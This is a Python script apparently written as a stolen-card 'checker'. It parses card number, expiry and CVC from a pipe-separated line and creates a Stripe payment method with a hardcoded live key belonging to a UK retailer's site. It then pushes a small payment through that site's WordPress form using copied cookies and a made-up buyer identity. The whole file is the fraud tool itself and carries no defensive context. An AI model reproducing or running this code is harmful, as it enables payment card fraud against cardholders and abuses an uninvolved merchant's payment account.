import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&key=pk_live_51JRjSQJvSIqoM1gBH5hwGChY81oiXYm2rOdQyZjudLBQQ9kE16Oh2vf8nyy4bRrsoUJ1P9SgQJ5rMhv49RcHh7Rm00wQdeXh84'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '__cf_bm': 'tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw',
	    '_fbp': 'fb.2.1740399662778.157652016478123277',
	    'cookieyes-consent': 'consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
	    '_ga_59B60VWWYG': 'GS1.1.1740399662.1.0.1740399662.0.0.1057425111',
	    '_ga': 'GA1.1.1773205121.1740399663',
	    '__stripe_mid': 'f435ef71-f199-4863-9e2b-f51dd02b4b2731905d',
	    '__stripe_sid': '65f16e25-cf7e-4d24-b7ac-3a8b2b0927fa020fce',
	    '_gcl_au': '1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
	}
	
	headers = {
	    'authority': 'evelie.co.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '__cf_bm=tYGL6a4UNQIIzY_kkQCTlEsGbbu8V4PRxK8K553eGXc-1740399658-1.0.1.1-G2vhUQpFMszc003ju73Oarafe.eMjg9gB0s.H.9y8rvxR_KRAwDRTiuiyxX5U8gH3ueV_Opl1guZVdeyiEMrDw; _fbp=fb.2.1740399662778.157652016478123277; cookieyes-consent=consentid:bzFQbnc3TUdrbTBTcWt0aG5lR2xsUXA4NE5IMFFEOWg,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _ga_59B60VWWYG=GS1.1.1740399662.1.0.1740399662.0.0.1057425111; _ga=GA1.1.1773205121.1740399663; __stripe_mid=f435ef71-f199-4863-9e2b-f51dd02b4b2731905d; __stripe_sid=65f16e25-cf7e-4d24-b7ac-3a8b2b0927fa020fce; _gcl_au=1.1.1127129083.1740399661.1033584891.1740399744.1740399744',
	    'origin': 'https://evelie.co.uk',
	    'referer': 'https://evelie.co.uk/sjsa-test-page/?srsltid=AfmBOopFpm3xQbjK_b5BpgnUAQpn4sG8NlYEIbaR0JPgiGDClnz1YhOt',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1740399744942',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=22376&_fluentform_20_fluentformnonce=d96d8aea3b&_wp_http_referer=%2Fsjsa-test-page%2F%3Fsrsltid%3DAfmBOopFpm3xQbjK_b5BpgnUAQpn4sG8NlYEIbaR0JPgiGDClnz1YhOt&names%5Bfirst_name%5D=Rodam%20User&names%5Blast_name%5D=&email=rodamuser20%40gmail.com&phone=0817480671&numeric_field=1&numeric_field_1=20&custom-payment-amount=0.30&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '20',
	}
	
	r2 = requests.post('https://evelie.co.uk/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
